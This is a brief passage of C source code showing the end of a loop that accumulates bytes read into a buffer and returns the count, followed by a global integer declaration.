        if(cc <= 0)
            return(cc);
        buf += cc;
        n1 += cc;
    }
    return(n1);
}
int zz;
